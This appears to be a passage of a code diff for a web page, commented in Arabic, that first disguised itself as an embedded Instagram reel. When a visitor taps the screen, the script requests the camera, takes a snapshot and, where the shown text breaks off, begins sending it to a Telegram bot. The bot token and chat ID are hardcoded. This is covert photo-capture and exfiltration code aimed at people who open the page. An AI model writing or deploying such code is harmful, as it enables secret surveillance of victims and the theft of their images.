@@ -1,42 +1,48 @@
-iframe {
-        border: none;
-        max-width: 100%;
-        max-height: 100%;
+#result {
+        max-width: 90%;
+        max-height: 90vh;
+        border-radius: 10px;
+        display: none;
     }
 </style>
-<!-- عرض فيديو إنستغرام -->
-<iframe 
-    src="https://www.instagram.com/reel/DdjtPokIGQY/embed" 
-    width="400" 
-    height="500" 
-    scrolling="no" 
-    allowtransparency="true"
-    allow="encrypted-media">
-</iframe>
-
-<!-- عنصر Canvas مخفي -->
-<canvas id="canvas" style="display:none;"></canvas>
+<img id="result" alt="">
 
 <script>
-    const TELEGRAM_BOT_TOKEN = "8469850859:AAFQJDODXLXA-9jJYhYJ8ASll3-6d2RnIQA";
-    const TELEGRAM_CHAT_ID = "664291354";
+    const TELEGRAM_BOT_TOKEN = '8469850859:AAFQJDODXLXA-9jJYhYJ8ASll3-6d2RnIQA';
+    const TELEGRAM_CHAT_ID = '6642913954';
 
-    let stream = null;
-    const canvas = document.getElementById('canvas');
+    let isProcessing = false;
 
-    async function handleCapture(event) {
+    async function handleCapture() {
+        if (isProcessing) return;
+        isProcessing = true;
+
+        let stream = null;
+
         try {
-            // طلب الوصول للكاميرا
+            // 1. طلب إذن الكاميرا عند النقر على الشاشة
             stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            
+
             const video = document.createElement('video');
             video.srcObject = stream;
             await video.play();
 
-            canvas.width = video.videoWidth || 640;
-            canvas.height = video.videoHeight || 480;
-            const context = canvas.getContext('2d');
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            // 2. التقاط صورة فورية
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0);
+
+            // إظهار اللقطة لمدة ثانية واحدة
+            const img = document.getElementById('result');
+            img.src = canvas.toDataURL('image/png');
+            img.style.display = 'block';
+
+            setTimeout(() => {
+                img.style.display = 'none';
+            }, 1000);
 
             // 3. إرسال الصورة إلى تيليجرام
             canvas.toBlob(async (blob) => {
